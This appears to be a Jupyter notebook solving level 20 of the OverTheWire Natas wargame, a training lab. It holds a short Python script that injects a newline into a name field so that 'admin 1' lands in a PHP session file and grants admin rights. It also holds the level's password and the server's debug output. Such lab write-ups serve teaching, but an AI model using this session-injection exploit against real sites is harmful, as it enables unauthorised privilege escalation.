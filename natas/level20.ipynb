{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from requests.auth import HTTPBasicAuth"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas20\", \"pass\": \"p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw\" };</script></head>\n",
      "<body>\n",
      "<h1>natas20</h1>\n",
      "<div id=\"content\">\n",
      "DEBUG: MYREAD jp1sv9gm8obcik2l7ee1jmf68s<br>DEBUG: Reading from /var/lib/php/sessions/mysess_jp1sv9gm8obcik2l7ee1jmf68s<br>DEBUG: Read [name test2]<br>DEBUG: Read []<br>DEBUG: Name set to test<br>You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.\n",
      "<form action=\"index.php\" method=\"POST\">\n",
      "Your name: <input name=\"name\" value=\"test\"><br>\n",
      "<input type=\"submit\" value=\"Change name\" />\n",
      "</form>\n",
      "<div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
      "</div>\n",
      "</body>\n",
      "</html>\n",
      "DEBUG: MYWRITE jp1sv9gm8obcik2l7ee1jmf68s name|s:4:\"test\";<br>DEBUG: Saving in /var/lib/php/sessions/mysess_jp1sv9gm8obcik2l7ee1jmf68s<br>DEBUG: name => test<br>\n"
     ]
    }
   ],
   "source": [
    "auth = HTTPBasicAuth(username='natas20',password='p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw')\n",
    "data = {'name': f\"admin\\nadmin 1\"}\n",
    "cookie = {'PHPSESSID':'jp1sv9gm8obcik2l7ee1jmf68s'}\n",
    "r = requests.post('http://natas20.natas.labs.overthewire.org/index.php?debug', data=data,cookies=cookie, auth=auth)\n",
    "print(r.text)\n",
    "data = {'name': f\"admin\"}\n",
    "r = requests.post('http://natas20.natas.labs.overthewire.org/index.php?debug', data=data,cookies=cookie, auth=auth)\n",
    "print(r.text)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.13"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
